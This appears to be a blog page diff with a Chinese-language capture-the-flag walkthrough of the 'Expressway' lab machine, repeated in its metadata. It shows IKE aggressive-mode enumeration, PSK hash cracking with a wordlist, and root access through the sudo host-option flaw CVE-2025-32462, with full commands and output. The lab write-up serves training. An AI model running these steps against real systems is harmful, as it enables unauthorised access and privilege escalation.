@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/99706997?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 信息收集
+
+```
+nmap --min-rate 10000 -p- 10.129.238.52
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 15:21 CST
+Nmap scan report for 10.129.238.52 (10.129.238.52)
+Host is up (0.13s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 1 IP address (1 host up) scanned in 10.35 seconds
+tcp只开放ssh，不进一步利用
+
+nmap -sU --top-ports 20 10.129.238.52
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 15:22 CST
+Nmap scan report for 10.129.238.52 (10.129.238.52)
+Host is up (0.16s latency).
+
+PORT      STATE         SERVICE
+53/udp    closed        domain
+67/udp    closed        dhcps
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+123/udp   closed        ntp
+135/udp   closed        msrpc
+137/udp   closed        netbios-ns
+138/udp   closed        netbios-dgm
+139/udp   closed        netbios-ssn
+161/udp   closed        snmp
+162/udp   closed        snmptrap
+445/udp   closed        microsoft-ds
+500/udp   open          isakmp
+514/udp   closed        syslog
+520/udp   closed        route
+631/udp   closed        ipp
+1434/udp  closed        ms-sql-m
+1900/udp  closed        upnp
+4500/udp  open|filtered nat-t-ike
+49152/udp closed        unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 27.80 seconds
+```
+tcp只开放ssh，转向udp开放isakmp
+
+对udp500进行利用
+```
+ike-scan -M 10.129.19.97
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.19.97    Main Mode Handshake returned
+        HDR=(CKY-R=a75c3aeae422fbcb)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.116 seconds (8.61 hosts/sec).  1 returned handshake; 0 returned notify
+
+ike-scan -P -M -A -n hacker 10.129.19.97
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.19.97    Aggressive Mode Handshake returned
+        HDR=(CKY-R=263706561a844745)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+b1fb5eb8e70a8e966d7e82ce9edcd1a047e9b63937a090df14c5568ca31dff05cac4073fe2af130faed9d4486ef5ace4b4b28d6c1dc2ee21e1351b5cd779f11cbc3113520f2bc3ac5560eb34f576306004d29beca5beb32daf20d04fbb7104e39a3b6c7046d53fa195a50e4d3acc56a41b9d6caa1d21a0e5be974f5579ac7c77:b361fdd21f1bf265e4f53706e225919d4a176c936bff85051b6c7db5439971e33ae3000297da47e2f29778601e89ad8e4a5032d8a4a81469e5d890bfb0d3b75221e5ce548d39b3df094a9dfc2dc0ef2db6c29205ebfc587252656d56a1170869a9eab31562f8a80015250ef474d8515b4cd0e57948e7c644774a97b956cc18bb:263706561a844745:06be6f0563285785:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:d9b866b85fcbabec7a4fe7cad4c5bc759124fbb9:89ccf922ccb6e1514d4825fa0f9310dcc1c42d3fd4ad56b639fdf9424ddc99ef:be8838533d86e84a17441c7843ed29dc17038d8b
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.119 seconds (8.40 hosts/sec).  1 returned handshake; 0 returned notify
+```
+可以看到服务端会基于id伪造hash，不过同时也暴露了id
+```
+ike-scan -P -M -A -n ike@expressway.htb 10.129.19.97
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.19.97    Aggressive Mode Handshake returned
+        HDR=(CKY-R=df98dc313310319d)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+8070ae1e673f3b9dec01ec3c4ce1b680ac33de9541499b26c95ade1367d2e3b6ecac6056b11ea3605dbd7ef36cf26aa210088ba1017a8e2afede7f81f0fa2cdb596430cf1f64d57baeda5180a0159f9ed7d2b140469249fdf4005f148482303384ea39724ad7a2d835416b044e085c97cbc44f7f3a29135ff735c305e553e00e:d982778c68b1330ffe6cf7d319fc10fb772ccf65be5385347fe5eb795e24cbf35a0a457b067cf6369fd7e053d3d0f9ce332e5746a0c1ca51b5937dda73b78035e792f79ca61080a3ea96748eefd801cfe6c5c58c8961fd95aa05cec6d153ebaca90460f0ce832740f16023e47dcd2f0313edaa2ddde35a77625dd477c6acdcf9:df98dc313310319d:b4f0ec57822533b9:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:59d8bd04d6aa3f430fba243acee4da65630ade28:b298fd746280c357d303310b63f4cfa3071c19a6c13f3710223d640e08b6a06a:70e467f9fe0ba53e972f8942c05af7526ec02e09
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.118 seconds (8.49 hosts/sec).  1 returned handshake; 0 returned notify
+```
+得到密码
+```
+psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
+Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
+Running in dictionary cracking mode
+key 'freakingrockstarontheroad' matches SHA1 hash 70e467f9fe0ba53e972f8942c05af7526ec02e09
+Ending psk-crack: 8045040 iterations in 3.992 seconds (2015108.35 iterations/sec)
+```
+# 提权
+
+```
+ssh ike@10.129.19.97
+
+ike@expressway:~$ id
+uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
+```
+ike用户在proxy组，可以看到sudo的版本存在漏洞CVE-2025-32462
+```
+ike@expressway:~$ sudo -l
+Password:
+Sorry, user ike may not run sudo on expressway.
+ike@expressway:~$ sudo --version
+Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.17
+Sudoers audit plugin version 1.9.17
+```
+
+接下来找ike有完全权限的子域
+```
+ike@expressway:~$ find / -group proxy 2>/dev/null
+/run/squid
+/var/spool/squid
+/var/spool/squid/netdb.state
+/var/log/squid
+/var/log/squid/cache.log.2.gz
+/var/log/squid/access.log.2.gz
+/var/log/squid/cache.log.1
+/var/log/squid/access.log.1
+ike@expressway:~$ cat /var/log/squid/access.log.1 | grep htb
+1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
+ike@expressway:~$
+```
+可以找到`offramp.expressway.htb`子域，根据文件所属可以猜测尝试
+```
+sudo -l -h offramp.expressway.htb
+Matching Defaults entries for ike on offramp:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User ike may run the following commands on offramp:
+    (root) NOPASSWD: ALL
+    (root) NOPASSWD: ALL
+```
+
+
+```
+ike@expressway:~$ sudo -s -h offramp.expressway.htb
+root@expressway:/home/ike# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+。">
+<meta property="og:title" content="Expressway">
+<meta property="og:description" content="# 信息收集
+
+```
+nmap --min-rate 10000 -p- 10.129.238.52
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 15:21 CST
+Nmap scan report for 10.129.238.52 (10.129.238.52)
+Host is up (0.13s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 1 IP address (1 host up) scanned in 10.35 seconds
+tcp只开放ssh，不进一步利用
+
+nmap -sU --top-ports 20 10.129.238.52
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 15:22 CST
+Nmap scan report for 10.129.238.52 (10.129.238.52)
+Host is up (0.16s latency).
+
+PORT      STATE         SERVICE
+53/udp    closed        domain
+67/udp    closed        dhcps
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+123/udp   closed        ntp
+135/udp   closed        msrpc
+137/udp   closed        netbios-ns
+138/udp   closed        netbios-dgm
+139/udp   closed        netbios-ssn
+161/udp   closed        snmp
+162/udp   closed        snmptrap
+445/udp   closed        microsoft-ds
+500/udp   open          isakmp
+514/udp   closed        syslog
+520/udp   closed        route
+631/udp   closed        ipp
+1434/udp  closed        ms-sql-m
+1900/udp  closed        upnp
+4500/udp  open|filtered nat-t-ike
+49152/udp closed        unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 27.80 seconds
+```
+tcp只开放ssh，转向udp开放isakmp
+
+对udp500进行利用
+```
+ike-scan -M 10.129.19.97
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.19.97    Main Mode Handshake returned
+        HDR=(CKY-R=a75c3aeae422fbcb)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.116 seconds (8.61 hosts/sec).  1 returned handshake; 0 returned notify
+
+ike-scan -P -M -A -n hacker 10.129.19.97
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.19.97    Aggressive Mode Handshake returned
+        HDR=(CKY-R=263706561a844745)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+b1fb5eb8e70a8e966d7e82ce9edcd1a047e9b63937a090df14c5568ca31dff05cac4073fe2af130faed9d4486ef5ace4b4b28d6c1dc2ee21e1351b5cd779f11cbc3113520f2bc3ac5560eb34f576306004d29beca5beb32daf20d04fbb7104e39a3b6c7046d53fa195a50e4d3acc56a41b9d6caa1d21a0e5be974f5579ac7c77:b361fdd21f1bf265e4f53706e225919d4a176c936bff85051b6c7db5439971e33ae3000297da47e2f29778601e89ad8e4a5032d8a4a81469e5d890bfb0d3b75221e5ce548d39b3df094a9dfc2dc0ef2db6c29205ebfc587252656d56a1170869a9eab31562f8a80015250ef474d8515b4cd0e57948e7c644774a97b956cc18bb:263706561a844745:06be6f0563285785:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:d9b866b85fcbabec7a4fe7cad4c5bc759124fbb9:89ccf922ccb6e1514d4825fa0f9310dcc1c42d3fd4ad56b639fdf9424ddc99ef:be8838533d86e84a17441c7843ed29dc17038d8b
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.119 seconds (8.40 hosts/sec).  1 returned handshake; 0 returned notify
+```
+可以看到服务端会基于id伪造hash，不过同时也暴露了id
+```
+ike-scan -P -M -A -n ike@expressway.htb 10.129.19.97
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.19.97    Aggressive Mode Handshake returned
+        HDR=(CKY-R=df98dc313310319d)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+8070ae1e673f3b9dec01ec3c4ce1b680ac33de9541499b26c95ade1367d2e3b6ecac6056b11ea3605dbd7ef36cf26aa210088ba1017a8e2afede7f81f0fa2cdb596430cf1f64d57baeda5180a0159f9ed7d2b140469249fdf4005f148482303384ea39724ad7a2d835416b044e085c97cbc44f7f3a29135ff735c305e553e00e:d982778c68b1330ffe6cf7d319fc10fb772ccf65be5385347fe5eb795e24cbf35a0a457b067cf6369fd7e053d3d0f9ce332e5746a0c1ca51b5937dda73b78035e792f79ca61080a3ea96748eefd801cfe6c5c58c8961fd95aa05cec6d153ebaca90460f0ce832740f16023e47dcd2f0313edaa2ddde35a77625dd477c6acdcf9:df98dc313310319d:b4f0ec57822533b9:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:59d8bd04d6aa3f430fba243acee4da65630ade28:b298fd746280c357d303310b63f4cfa3071c19a6c13f3710223d640e08b6a06a:70e467f9fe0ba53e972f8942c05af7526ec02e09
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.118 seconds (8.49 hosts/sec).  1 returned handshake; 0 returned notify
+```
+得到密码
+```
+psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
+Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
+Running in dictionary cracking mode
+key 'freakingrockstarontheroad' matches SHA1 hash 70e467f9fe0ba53e972f8942c05af7526ec02e09
+Ending psk-crack: 8045040 iterations in 3.992 seconds (2015108.35 iterations/sec)
+```
+# 提权
+
+```
+ssh ike@10.129.19.97
+
+ike@expressway:~$ id
+uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
+```
+ike用户在proxy组，可以看到sudo的版本存在漏洞CVE-2025-32462
+```
+ike@expressway:~$ sudo -l
+Password:
+Sorry, user ike may not run sudo on expressway.
+ike@expressway:~$ sudo --version
+Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.17
+Sudoers audit plugin version 1.9.17
+```
+
+接下来找ike有完全权限的子域
+```
+ike@expressway:~$ find / -group proxy 2>/dev/null
+/run/squid
+/var/spool/squid
+/var/spool/squid/netdb.state
+/var/log/squid
+/var/log/squid/cache.log.2.gz
+/var/log/squid/access.log.2.gz
+/var/log/squid/cache.log.1
+/var/log/squid/access.log.1
+ike@expressway:~$ cat /var/log/squid/access.log.1 | grep htb
+1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
+ike@expressway:~$
+```
+可以找到`offramp.expressway.htb`子域，根据文件所属可以猜测尝试
+```
+sudo -l -h offramp.expressway.htb
+Matching Defaults entries for ike on offramp:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User ike may run the following commands on offramp:
+    (root) NOPASSWD: ALL
+    (root) NOPASSWD: ALL
+```
+
+
+```
+ike@expressway:~$ sudo -s -h offramp.expressway.htb
+root@expressway:/home/ike# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://faabbi.github.io/post/Expressway.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
+<title>Expressway</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Expressway</h1>
+<div class="title-right">
+    <a href="https://faabbi.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/faabbi/faabbi.github.io/issues/21" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>信息收集</h1>
+<pre class="notranslate"><code class="notranslate">nmap --min-rate 10000 -p- 10.129.238.52
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 15:21 CST
+Nmap scan report for 10.129.238.52 (10.129.238.52)
+Host is up (0.13s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 1 IP address (1 host up) scanned in 10.35 seconds
+tcp只开放ssh，不进一步利用
+
+nmap -sU --top-ports 20 10.129.238.52
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 15:22 CST
+Nmap scan report for 10.129.238.52 (10.129.238.52)
+Host is up (0.16s latency).
+
+PORT      STATE         SERVICE
+53/udp    closed        domain
+67/udp    closed        dhcps
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+123/udp   closed        ntp
+135/udp   closed        msrpc
+137/udp   closed        netbios-ns
+138/udp   closed        netbios-dgm
+139/udp   closed        netbios-ssn
+161/udp   closed        snmp
+162/udp   closed        snmptrap
+445/udp   closed        microsoft-ds
+500/udp   open          isakmp
+514/udp   closed        syslog
+520/udp   closed        route
+631/udp   closed        ipp
+1434/udp  closed        ms-sql-m
+1900/udp  closed        upnp
+4500/udp  open|filtered nat-t-ike
+49152/udp closed        unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 27.80 seconds
+</code></pre>
+<p>tcp只开放ssh，转向udp开放isakmp</p>
+<p>对udp500进行利用</p>
+<pre class="notranslate"><code class="notranslate">ike-scan -M 10.129.19.97
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.19.97    Main Mode Handshake returned
+        HDR=(CKY-R=a75c3aeae422fbcb)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.116 seconds (8.61 hosts/sec).  1 returned handshake; 0 returned notify
+
+ike-scan -P -M -A -n hacker 10.129.19.97
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.19.97    Aggressive Mode Handshake returned
+        HDR=(CKY-R=263706561a844745)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+b1fb5eb8e70a8e966d7e82ce9edcd1a047e9b63937a090df14c5568ca31dff05cac4073fe2af130faed9d4486ef5ace4b4b28d6c1dc2ee21e1351b5cd779f11cbc3113520f2bc3ac5560eb34f576306004d29beca5beb32daf20d04fbb7104e39a3b6c7046d53fa195a50e4d3acc56a41b9d6caa1d21a0e5be974f5579ac7c77:b361fdd21f1bf265e4f53706e225919d4a176c936bff85051b6c7db5439971e33ae3000297da47e2f29778601e89ad8e4a5032d8a4a81469e5d890bfb0d3b75221e5ce548d39b3df094a9dfc2dc0ef2db6c29205ebfc587252656d56a1170869a9eab31562f8a80015250ef474d8515b4cd0e57948e7c644774a97b956cc18bb:263706561a844745:06be6f0563285785:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:d9b866b85fcbabec7a4fe7cad4c5bc759124fbb9:89ccf922ccb6e1514d4825fa0f9310dcc1c42d3fd4ad56b639fdf9424ddc99ef:be8838533d86e84a17441c7843ed29dc17038d8b
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.119 seconds (8.40 hosts/sec).  1 returned handshake; 0 returned notify
+</code></pre>
+<p>可以看到服务端会基于id伪造hash，不过同时也暴露了id</p>
+<pre class="notranslate"><code class="notranslate">ike-scan -P -M -A -n ike@expressway.htb 10.129.19.97
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.19.97    Aggressive Mode Handshake returned
+        HDR=(CKY-R=df98dc313310319d)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+8070ae1e673f3b9dec01ec3c4ce1b680ac33de9541499b26c95ade1367d2e3b6ecac6056b11ea3605dbd7ef36cf26aa210088ba1017a8e2afede7f81f0fa2cdb596430cf1f64d57baeda5180a0159f9ed7d2b140469249fdf4005f148482303384ea39724ad7a2d835416b044e085c97cbc44f7f3a29135ff735c305e553e00e:d982778c68b1330ffe6cf7d319fc10fb772ccf65be5385347fe5eb795e24cbf35a0a457b067cf6369fd7e053d3d0f9ce332e5746a0c1ca51b5937dda73b78035e792f79ca61080a3ea96748eefd801cfe6c5c58c8961fd95aa05cec6d153ebaca90460f0ce832740f16023e47dcd2f0313edaa2ddde35a77625dd477c6acdcf9:df98dc313310319d:b4f0ec57822533b9:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:59d8bd04d6aa3f430fba243acee4da65630ade28:b298fd746280c357d303310b63f4cfa3071c19a6c13f3710223d640e08b6a06a:70e467f9fe0ba53e972f8942c05af7526ec02e09
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.118 seconds (8.49 hosts/sec).  1 returned handshake; 0 returned notify
+</code></pre>
+<p>得到密码</p>
+<pre class="notranslate"><code class="notranslate">psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
+Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
+Running in dictionary cracking mode
+key "freakingrockstarontheroad" matches SHA1 hash 70e467f9fe0ba53e972f8942c05af7526ec02e09
+Ending psk-crack: 8045040 iterations in 3.992 seconds (2015108.35 iterations/sec)
+</code></pre>
+<h1>提权</h1>
+<pre class="notranslate"><code class="notranslate">ssh ike@10.129.19.97
+
+ike@expressway:~$ id
+uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
+</code></pre>
+<p>ike用户在proxy组，可以看到sudo的版本存在漏洞<a title="CVE-2025-32462" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-c5x2-97hm-x895/hovercard" href="https://github.com/advisories/GHSA-c5x2-97hm-x895">CVE-2025-32462</a></p>
+<pre class="notranslate"><code class="notranslate">ike@expressway:~$ sudo -l
+Password:
+Sorry, user ike may not run sudo on expressway.
+ike@expressway:~$ sudo --version
+Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.17
+Sudoers audit plugin version 1.9.17
+</code></pre>
+<p>接下来找ike有完全权限的子域</p>
+<pre class="notranslate"><code class="notranslate">ike@expressway:~$ find / -group proxy 2&gt;/dev/null
+/run/squid
+/var/spool/squid
+/var/spool/squid/netdb.state
+/var/log/squid
+/var/log/squid/cache.log.2.gz
+/var/log/squid/access.log.2.gz
+/var/log/squid/cache.log.1
+/var/log/squid/access.log.1
+ike@expressway:~$ cat /var/log/squid/access.log.1 | grep htb
+1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
+ike@expressway:~$
+</code></pre>
+<p>可以找到<code class="notranslate">offramp.expressway.htb</code>子域，根据文件所属可以猜测尝试</p>
+<pre class="notranslate"><code class="notranslate">sudo -l -h offramp.expressway.htb
+Matching Defaults entries for ike on offramp:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User ike may run the following commands on offramp:
+    (root) NOPASSWD: ALL
+    (root) NOPASSWD: ALL
+</code></pre>
+<pre class="notranslate"><code class="notranslate">ike@expressway:~$ sudo -s -h offramp.expressway.htb
+root@expressway:/home/ike# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://faabbi.github.io">MJ</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
